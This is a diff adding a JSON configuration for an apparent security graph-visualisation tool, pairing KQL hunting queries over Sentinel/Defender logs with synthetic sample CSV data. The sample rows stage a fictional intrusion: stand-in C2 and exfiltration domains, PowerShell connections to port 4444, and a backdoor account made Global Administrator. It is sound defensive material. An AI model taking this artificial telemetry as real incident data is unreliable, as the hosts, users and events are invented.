+                                                           "low":  "#facc15",
+                                                           "medium":  "#f59e0b",
+                                                           "high":  "#ef4444",
+                                                           "none":  "#6b7280"
+                                                       },
+                                         "from_column":  "user",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "upn",
+                                                            "risk_state",
+                                                            "ip",
+                                                            "detection_type"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "User Risk Events"
+    },
+    {
+        "csv":  "timestamp,account,account_domain,device,failure_reason,logon_type,process\r\n2025-07-01 10:55,charlie,CONTOSO,SRV-DC-01,WrongPassword,Network,lsass.exe\r\n2025-07-01 11:01,charlie,CONTOSO,SRV-DC-01,WrongPassword,Network,lsass.exe\r\n2025-07-01 11:02,charlie,CONTOSO,SRV-DC-01,WrongPassword,Network,lsass.exe\r\n2025-07-01 11:10,hacker,CONTOSO,SRV-DC-01,AccountLockedOut,Network,lsass.exe\r\n2025-07-01 11:15,hacker,CONTOSO,SRV-FILE-01,AccountLockedOut,Network,lsass.exe\r\n2025-07-01 11:20,hacker,CONTOSO,SRV-SQL-01,AccountLockedOut,Network,lsass.exe\r\n2025-07-01 12:00,svc-backup,CONTOSO,SRV-BACKUP-01,AccountExpired,Service,services.exe\r\n2025-07-01 13:00,bob,CONTOSO,SRV-DC-01,WrongPassword,Interactive,LogonUI.exe\r\n2025-07-01 14:00,alice,CONTOSO,SRV-SQL-01,Unknown,Network,lsass.exe",
+        "version":  1,
+        "config":  {
+                       "title":  "Device Logon Failures",
+                       "query":  "DeviceLogonEvents\r\n| where TimeGenerated \u003e ago(1d)\r\n| where ActionType == \"LogonFailed\"\r\n| where isnotempty(AccountName) and isnotempty(DeviceName)\r\n| project\r\n    timestamp      = TimeGenerated,\r\n    account        = AccountName,\r\n    account_domain = AccountDomain,\r\n    device         = DeviceName,\r\n    failure_reason = FailureReason,\r\n    logon_type     = LogonType,\r\n    process        = InitiatingProcessFileName\r\n| take 200",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "account",
+                                         "type":  "user",
+                                         "properties":  [
+                                                            "account_domain"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "device",
+                                         "type":  "machine",
+                                         "properties":  [
+
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "block",
+                       "edges":  [
+                                     {
+                                         "label_column":  "failure_reason",
+                                         "to_column":  "device",
+                                         "color_map":  {
+                                                           "AccountLockedOut":  "#ef4444",
+                                                           "AccountExpired":  "#6b7280",
+                                                           "WrongPassword":  "#f59e0b",
+                                                           "Unknown":  "#4b5563"
+                                                       },
+                                         "from_column":  "account",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "account_domain",
+                                                            "logon_type",
+                                                            "process"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "Device Logon Failures"
+    },
+    {
+        "csv":  "timestamp,device,src_ip,domain,result,query_type,threat,threat_cat\r\n2025-07-01 08:00,PC-BOB-01,10.1.2.8,teams.microsoft.com,Success,A,,\r\n2025-07-01 08:01,PC-BOB-01,10.1.2.8,login.microsoftonline.com,Success,A,,\r\n2025-07-01 09:00,PC-CHARLIE-01,10.1.3.12,evil-c2.darknet.ru,Success,A,Cobalt Strike C2,Malware\r\n2025-07-01 09:01,PC-CHARLIE-01,10.1.3.12,update-cdn.evil.io,Success,A,Trojan Downloader,Malware\r\n2025-07-01 09:02,PC-CHARLIE-01,10.1.3.12,beacon.attacker.com,Success,TXT,C2 Beacon,C2\r\n2025-07-01 10:00,SRV-FILE-01,10.1.5.10,sharepoint.com,Success,A,,\r\n2025-07-01 10:05,SRV-FILE-01,10.1.5.10,malware-host.xyz,Failure,A,Ransomware,Malware\r\n2025-07-01 11:00,SRV-DC-01,10.1.0.1,contoso.com,Success,A,,\r\n2025-07-01 11:05,PC-ALICE-01,10.1.1.5,phishing-page.net,Failure,A,Phishing,Phishing",
+        "version":  1,
+        "config":  {
+                       "title":  "DNS Query Graph",
+                       "query":  "ASimDnsActivityLogs\r\n| where TimeGenerated \u003e ago(1d)\r\n| where isnotempty(DvcHostname) and isnotempty(DnsQuery)\r\n| project\r\n    timestamp  = TimeGenerated,\r\n    device     = DvcHostname,\r\n    src_ip     = SrcIpAddr,\r\n    domain     = DnsQuery,\r\n    result     = EventResult,\r\n    query_type = DnsQueryTypeName,\r\n    threat     = ThreatName,\r\n    threat_cat = ThreatCategory\r\n| take 300",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "device",
+                                         "type":  "machine",
+                                         "properties":  [
+                                                            "src_ip"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "domain",
+                                         "type":  "domain",
+                                         "properties":  [
+                                                            "threat",
+                                                            "threat_cat"
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "globe",
+                       "edges":  [
+                                     {
+                                         "label_column":  "result",
+                                         "to_column":  "domain",
+                                         "color_map":  {
+                                                           "NA":  "#6b7280",
+                                                           "Success":  "#10b981",
+                                                           "Failure":  "#ef4444"
+                                                       },
+                                         "from_column":  "device",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "src_ip",
+                                                            "query_type",
+                                                            "threat",
+                                                            "threat_cat"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "DNS Query Graph"
+    },
+    {
+        "csv":  "timestamp,user,app,resource,result,ip,client_app,risk_level\r\n2025-07-01 08:00,Alice Smith,Microsoft Graph,Microsoft Graph,Success,10.1.1.5,MSAL,none\r\n2025-07-01 08:01,Alice Smith,Azure Key Vault,Azure Key Vault,Success,10.1.1.5,MSAL,none\r\n2025-07-01 09:00,svc-backup,Azure Storage,Azure Storage,Success,10.1.5.20,Service,none\r\n2025-07-01 09:01,svc-backup,Azure SQL Database,Azure SQL Database,Success,10.1.5.20,Service,none\r\n2025-07-01 10:00,Charlie Brown,Microsoft Graph,Microsoft Graph,Success,185.220.101.9,Python,high\r\n2025-07-01 10:01,Charlie Brown,Exchange Online,Exchange Online,Success,185.220.101.9,Python,high\r\n2025-07-01 10:02,Charlie Brown,SharePoint Online,SharePoint Online,Failure,185.220.101.9,Python,high\r\n2025-07-01 11:00,Bob Johnson,Microsoft Graph,Microsoft Graph,Failure,10.1.2.8,MSAL,none\r\n2025-07-01 11:30,svc-monitoring,Azure Monitor,Azure Monitor,Success,10.1.6.5,Service,none",
+        "version":  1,
+        "config":  {
+                       "title":  "Non-Interactive Sign-ins",
+                       "query":  "AADNonInteractiveUserSignInLogs\r\n| where TimeGenerated \u003e ago(1d)\r\n| where isnotempty(UserDisplayName) and isnotempty(AppDisplayName)\r\n| extend result = iff(ResultType == \"0\", \"Success\", \"Failure\")\r\n| project\r\n    timestamp  = TimeGenerated,\r\n    user       = UserDisplayName,\r\n    app        = AppDisplayName,\r\n    resource   = ResourceDisplayName,\r\n    result,\r\n    ip         = IPAddress,\r\n    client_app = ClientAppUsed,\r\n    risk_level = RiskLevelDuringSignIn\r\n| take 300",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "user",
+                                         "type":  "user",
+                                         "properties":  [
+                                                            "ip",
+                                                            "risk_level"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "app",
+                                         "type":  "cloud",
+                                         "properties":  [
+                                                            "resource"
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "lock",
+                       "edges":  [
+                                     {
+                                         "label_column":  "result",
+                                         "to_column":  "app",
+                                         "color_map":  {
+                                                           "Success":  "#10b981",
+                                                           "Failure":  "#ef4444"
+                                                       },
+                                         "from_column":  "user",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "resource",
+                                                            "ip",
+                                                            "client_app",
+                                                            "risk_level"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "Non-Interactive Sign-ins"
+    },
+    {
+        "csv":  "timestamp,device,process,remote_ip,remote_url,port,action,bytes_sent\r\n2025-07-01 09:00,PC-BOB-01,chrome.exe,142.250.74.46,www.google.com,443,ConnectionSuccess,8200\r\n2025-07-01 09:01,PC-BOB-01,teams.exe,52.113.194.132,teams.microsoft.com,443,ConnectionSuccess,45000\r\n2025-07-01 09:30,PC-CHARLIE-01,powershell.exe,185.220.101.9,evil-c2.darknet.ru,4444,ConnectionSuccess,2048\r\n2025-07-01 09:31,PC-CHARLIE-01,powershell.exe,185.220.101.9,evil-c2.darknet.ru,1337,ConnectionSuccess,98000\r\n2025-07-01 09:45,PC-CHARLIE-01,mshta.exe,203.0.113.45,update-cdn.evil.io,80,ConnectionSuccess,512\r\n2025-07-01 10:00,SRV-FILE-01,svchost.exe,23.56.9.55,windowsupdate.com,443,ConnectionSuccess,12000\r\n2025-07-01 10:30,SRV-SQL-01,sqlservr.exe,198.51.100.12,,1433,ConnectionSuccess,500\r\n2025-07-01 11:00,PC-ALICE-01,outlook.exe,40.101.45.210,outlook.office365.com,443,ConnectionSuccess,3200\r\n2025-07-01 11:30,SRV-BACKUP-01,robocopy.exe,185.220.101.9,,8080,ConnectionSuccess,450000",
+        "version":  1,
+        "config":  {
+                       "title":  "Process Network Connections",
+                       "query":  "DeviceNetworkEvents\r\n| where TimeGenerated \u003e ago(1d)\r\n| where ActionType == \"ConnectionSuccess\"\r\n| where isnotempty(InitiatingProcessFileName) and isnotempty(RemoteIP)\r\n| where RemoteIP !startswith \"10.\" and RemoteIP !startswith \"192.168.\" and RemoteIP !startswith \"172.\"\r\n| project\r\n    timestamp  = TimeGenerated,\r\n    device     = DeviceName,\r\n    process    = InitiatingProcessFileName,\r\n    remote_ip  = RemoteIP,\r\n    remote_url = RemoteUrl,\r\n    port       = tostring(RemotePort),\r\n    action     = ActionType,\r\n    bytes_sent = SentBytes\r\n| take 200",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "device",
+                                         "type":  "machine",
+                                         "properties":  [
+
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "process",
+                                         "type":  "process",
+                                         "properties":  [
+
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "remote_ip",
+                                         "type":  "ip",
+                                         "properties":  [
+                                                            "remote_url"
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "radar",
+                       "edges":  [
+                                     {
+                                         "to_column":  "process",
+                                         "label":  "runs",
+                                         "from_column":  "device",
+                                         "properties":  [
+                                                            "timestamp"
+                                                        ]
+                                     },
+                                     {
+                                         "label_column":  "port",
+                                         "to_column":  "remote_ip",
+                                         "color_map":  {
+                                                           "4444":  "#ef4444",
+                                                           "80":  "#60a5fa",
+                                                           "443":  "#10b981",
+                                                           "1337":  "#ef4444",
+                                                           "8080":  "#f59e0b"
+                                                       },
+                                         "from_column":  "process",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "remote_url",
+                                                            "bytes_sent"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "Process Network Connections"
+    },
+    {
+        "csv":  "timestamp,user,machine,protocol,action,logon_type,location,ip\r\n2025-07-01 08:10,Alice Smith,PC-ALICE-01,Kerberos,LogonSuccess,Interactive,London,10.1.1.5\r\n2025-07-01 08:12,Alice Smith,SRV-FILE-01,Kerberos,LogonSuccess,Network,London,10.1.1.5\r\n2025-07-01 09:01,Bob Johnson,PC-BOB-01,Kerberos,LogonSuccess,Interactive,Berlin,10.1.2.8\r\n2025-07-01 09:05,Bob Johnson,SRV-FILE-01,NTLM,LogonSuccess,Network,Berlin,10.1.2.8\r\n2025-07-01 09:45,Bob Johnson,SRV-DC-01,NTLM,LogonSuccess,Network,Berlin,10.1.2.8\r\n2025-07-01 10:22,Charlie Brown,PC-CHARLIE-01,Kerberos,LogonSuccess,Interactive,Milan,10.1.3.12\r\n2025-07-01 10:55,Charlie Brown,SRV-DC-01,NTLM,LogonFailed,Network,Milan,10.1.3.12\r\n2025-07-01 11:02,Charlie Brown,SRV-DC-01,NTLM,LogonFailed,Network,TorExitNode,185.220.101.9\r\n2025-07-01 11:03,Charlie Brown,SRV-DC-01,Kerberos,LogonSuccess,Network,Milan,10.1.3.12\r\n2025-07-01 11:30,Alice Smith,SRV-DC-01,NTLM,LogonFailed,Network,London,10.1.1.5\r\n2025-07-01 12:00,hacker,SRV-SQL-01,NTLM,LogonFailed,Network,Beijing,203.0.113.88",
+        "version":  1,
+        "config":  {
+                       "title":  "Kerberos vs NTLM Auth Map",
+                       "query":  "IdentityLogonEvents\r\n| where TimeGenerated \u003e ago(1d)\r\n| where isnotempty(AccountDisplayName) and isnotempty(DeviceName)\r\n| where Protocol in (\"Kerberos\", \"NTLM\", \"PKU2U\")\r\n| project\r\n    timestamp  = TimeGenerated,\r\n    user       = AccountDisplayName,\r\n    machine    = DeviceName,\r\n    protocol   = Protocol,\r\n    action     = ActionType,\r\n    logon_type = LogonType,\r\n    location   = Location,\r\n    ip         = IPAddress\r\n| take 300",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "user",
+                                         "type":  "user",
+                                         "properties":  [
+                                                            "ip",
+                                                            "location"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "machine",
+                                         "type":  "machine",
+                                         "properties":  [
+
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "shield",
+                       "edges":  [
+                                     {
+                                         "label_column":  "protocol",
+                                         "to_column":  "machine",
+                                         "color_map":  {
+                                                           "PKU2U":  "#60a5fa",
+                                                           "Kerberos":  "#10b981",
+                                                           "NTLM":  "#ef4444"
+                                                       },
+                                         "from_column":  "user",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "action",
+                                                            "logon_type",
+                                                            "location",
+                                                            "ip"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "Kerberos vs NTLM Auth Map"
+    },
+    {
+        "csv":  "timestamp,admin,app,action,object,object_type,ip,country\r\n2025-07-01 09:00,Global Admin,Azure Active Directory,AddUser,alice@contoso.com,User,10.0.0.1,IT\r\n2025-07-01 09:05,Global Admin,Azure Active Directory,AddMember,Domain Admins,Group,10.0.0.1,IT\r\n2025-07-01 09:10,Global Admin,Microsoft 365 Admin,AssignLicense,bob@contoso.com,User,10.0.0.1,IT\r\n2025-07-01 10:00,charlie@contoso.com,Azure Active Directory,AddUser,backdoor@contoso.com,User,185.220.101.9,RU\r\n2025-07-01 10:01,charlie@contoso.com,Azure Active Directory,AddMember,Global Administrators,Group,185.220.101.9,RU\r\n2025-07-01 10:05,charlie@contoso.com,Exchange Online,SetMailboxPermission,Global Inbox,Mailbox,185.220.101.9,RU\r\n2025-07-01 11:00,Security Admin,Microsoft Defender,UpdatePolicy,Antivirus Policy,Policy,10.0.0.2,IT",
+        "version":  1,
+        "config":  {
+                       "title":  "Cloud Admin Operations",
+                       "query":  "CloudAppEvents\r\n| where TimeGenerated \u003e ago(7d)\r\n| where IsAdminOperation == true\r\n| where isnotempty(AccountDisplayName) and isnotempty(Application)\r\n| project\r\n    timestamp   = TimeGenerated,\r\n    admin       = AccountDisplayName,\r\n    app         = Application,\r\n    action      = ActionType,\r\n    object      = ObjectName,\r\n    object_type = ObjectType,\r\n    ip          = IPAddress,\r\n    country     = CountryCode\r\n| take 200",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "admin",
+                                         "type":  "user",
+                                         "properties":  [
+                                                            "ip",
+                                                            "country"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "app",
+                                         "type":  "cloud",
+                                         "properties":  [
+
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "object",
+                                         "type":  "group",
+                                         "properties":  [
+                                                            "object_type"
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "crown",
+                       "edges":  [
+                                     {
+                                         "label_column":  "action",
+                                         "to_column":  "app",
+                                         "from_column":  "admin",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "action",
+                                                            "ip",
+                                                            "country"
+                                                        ]
+                                     },
+                                     {
+                                         "label_column":  "object_type",
+                                         "to_column":  "object",
+                                         "from_column":  "app",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "object_type"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "Cloud Admin Operations"
+    },
+    {
+        "csv":  "timestamp,account,device,file,label,action,folder,process\r\n2025-07-01 08:00,alice,PC-ALICE-01,salary_data.xlsx,Highly Confidential,FileCreated,C:\\Finance,excel.exe\r\n2025-07-01 08:30,alice,PC-ALICE-01,salary_data.xlsx,Highly Confidential,FileModified,C:\\Finance,excel.exe\r\n2025-07-01 09:00,bob,PC-BOB-01,employee_pii.csv,Confidential,FileCreated,C:\\HR,notepad.exe\r\n2025-07-01 09:30,charlie,PC-CHARLIE-01,salary_data.xlsx,Highly Confidential,FileCreated,C:\\Users\\charlie\\Downloads,powershell.exe\r\n2025-07-01 09:31,charlie,PC-CHARLIE-01,credentials.txt,Confidential,FileCreated,C:\\Users\\charlie\\AppData,powershell.exe\r\n2025-07-01 10:00,SYSTEM,SRV-FILE-01,backup_archive.tar,Internal,FileModified,C:\\Backup,robocopy.exe\r\n2025-07-01 11:00,diana,PC-DIANA-01,public_report.pdf,Public,FileCreated,C:\\Reports,acrobat.exe\r\n2025-07-01 12:00,bob,SRV-FILE-01,HR_Database.mdf,Highly Confidential,FileCreated,C:\\SQL,sqlservr.exe",
+        "version":  1,
+        "config":  {
+                       "title":  "Sensitive File Access",
+                       "query":  "DeviceFileEvents\r\n| where TimeGenerated \u003e ago(7d)\r\n| where isnotempty(SensitivityLabel) and SensitivityLabel != \"\"\r\n| where isnotempty(InitiatingProcessAccountName) and isnotempty(FileName)\r\n| project\r\n    timestamp = TimeGenerated,\r\n    account   = InitiatingProcessAccountName,\r\n    device    = DeviceName,\r\n    file      = FileName,\r\n    label     = SensitivityLabel,\r\n    action    = ActionType,\r\n    folder    = FolderPath,\r\n    process   = InitiatingProcessFileName\r\n| take 200",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "account",
+                                         "type":  "user",
+                                         "properties":  [
+
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "device",
+                                         "type":  "machine",
+                                         "properties":  [
+
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "file",
+                                         "type":  "file",
+                                         "properties":  [
+                                                            "label",
+                                                            "folder"
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "lockfile",
+                       "edges":  [
+                                     {
+                                         "to_column":  "device",
+                                         "label":  "uses",
+                                         "from_column":  "account",
+                                         "properties":  [
+                                                            "process",
+                                                            "timestamp"
+                                                        ]
+                                     },
+                                     {
+                                         "label_column":  "label",
+                                         "to_column":  "file",
+                                         "color_map":  {
+                                                           "Public":  "#10b981",
+                                                           "Confidential":  "#f59e0b",
+                                                           "Highly Confidential":  "#ef4444",
+                                                           "Internal":  "#60a5fa"
+                                                       },
+                                         "from_column":  "device",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "action",
+                                                            "label",
+                                                            "folder",
+                                                            "process"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "Sensitive File Access"
+    },
+    {
+        "csv":  "timestamp,device,src_ip,domain,threat_name,threat_cat,result\n2025-07-01 09:00,PC-CHARLIE-01,10.1.3.12,evil-c2.darknet.ru,Cobalt Strike C2,Malware,Success\n2025-07-01 09:01,PC-CHARLIE-01,10.1.3.12,update-cdn.evil.io,Trojan Downloader,Malware,Success\n2025-07-01 09:02,PC-CHARLIE-01,10.1.3.12,beacon.attacker.com,C2 Beacon,C2,Success\n2025-07-01 09:30,SRV-FILE-01,10.1.5.10,malware-host.xyz,Ransomware Dropper,Malware,Failure\n2025-07-01 09:35,SRV-FILE-01,10.1.5.10,exfil-bucket.s3.attacker.io,Data Exfiltration,Exfiltration,Success\n2025-07-01 10:00,SRV-BACKUP-01,10.1.6.1,ransom-pay.onion.ws,Ransomware C2,Ransomware,Success\n2025-07-01 11:00,PC-BOB-01,10.1.2.8,phishing-page.net,Phishing Kit,Phishing,Failure\n2025-07-01 11:30,PC-BOB-01,10.1.2.8,credential-harvest.xyz,Phishing Kit,Phishing,Failure",
+        "version":  1,
+        "config":  {
+                       "title":  "Threat Intelligence DNS Hits",
+                       "query":  "ASimDnsActivityLogs\r\n| where TimeGenerated \u003e ago(7d)\r\n| where isnotempty(ThreatName) or isnotempty(ThreatCategory)\r\n| where isnotempty(DvcHostname) and isnotempty(DnsQuery)\r\n| project\r\n    timestamp   = TimeGenerated,\r\n    device      = DvcHostname,\r\n    src_ip      = SrcIpAddr,\r\n    domain      = DnsQuery,\r\n    threat_name = coalesce(ThreatName, \"Unknown\"),\r\n    threat_cat  = coalesce(ThreatCategory, \"Unknown\"),\r\n    result      = EventResult\r\n| take 200",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "device",
+                                         "type":  "machine",
+                                         "properties":  [
+                                                            "src_ip"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "domain",
+                                         "type":  "domain",
+                                         "properties":  [
+                                                            "threat_name"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "threat_cat",
+                                         "type":  "alert",
+                                         "properties":  [
+
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "target",
+                       "edges":  [
+                                     {
+                                         "label_column":  "result",
+                                         "to_column":  "domain",
+                                         "color_map":  {
+                                                           "Success":  "#ef4444",
+                                                           "Failure":  "#10b981"
+                                                       },
+                                         "from_column":  "device",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "src_ip",
+                                                            "result"
+                                                        ]
+                                     },
+                                     {
+                                         "label_column":  "threat_name",
+                                         "to_column":  "threat_cat",
+                                         "from_column":  "domain",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "threat_name"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "Threat Intelligence DNS Hits"
+    },
+    {
+        "csv":  "timestamp,actor,member,action,device,target_device\n2025-07-01 09:00,Admin,alice,Add member to group,SRV-DC-01,\n2025-07-01 09:05,Admin,bob,Add member to group,SRV-DC-01,\n2025-07-01 09:10,Admin,charlie,Add member to group,SRV-DC-01,\n2025-07-01 10:30,charlie,hacker,Add member to group,PC-CHARLIE-01,\n2025-07-01 10:35,charlie,svc-backup,Add member to group,PC-CHARLIE-01,\n2025-07-01 10:40,charlie,svc-monitoring,Add member to group,PC-CHARLIE-01,\n2025-07-01 12:00,Admin,hacker,Remove member from group,SRV-DC-01,\n2025-07-01 12:05,Admin,charlie,Remove member from group,SRV-DC-01,\n2025-07-01 13:00,Security Team,svc-backup,Remove member from group,SRV-DC-01,\n2025-07-01 13:05,Security Team,svc-monitoring,Remove member from group,SRV-DC-01,",
+        "version":  1,
+        "config":  {
+                       "title":  "Group Membership Changes",
+                       "query":  "IdentityDirectoryEvents\r\n| where TimeGenerated \u003e ago(30d)\r\n| where ActionType in (\"Add member to group\", \"Remove member from group\", \"Group Membership changed\")\r\n| where isnotempty(AccountDisplayName) and isnotempty(TargetAccountDisplayName)\r\n| project\r\n    timestamp     = TimeGenerated,\r\n    actor         = AccountDisplayName,\r\n    member        = TargetAccountDisplayName,\r\n    action        = ActionType,\r\n    device        = DeviceName,\r\n    target_device = TargetDeviceName\r\n| take 200",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "actor",
+                                         "type":  "user",
+                                         "properties":  [
+                                                            "device"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "member",
+                                         "type":  "user",
+                                         "properties":  [
+
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "blast",
+                       "edges":  [
+                                     {
+                                         "label_column":  "action",
+                                         "to_column":  "member",
+                                         "color_map":  {
+                                                           "Remove member from group":  "#ef4444",
+                                                           "Add member to group":  "#10b981",
+                                                           "Group Membership changed":  "#f59e0b"
+                                                       },
+                                         "from_column":  "actor",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "device",
+                                                            "target_device"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "Group Membership Changes"
+    }
+]
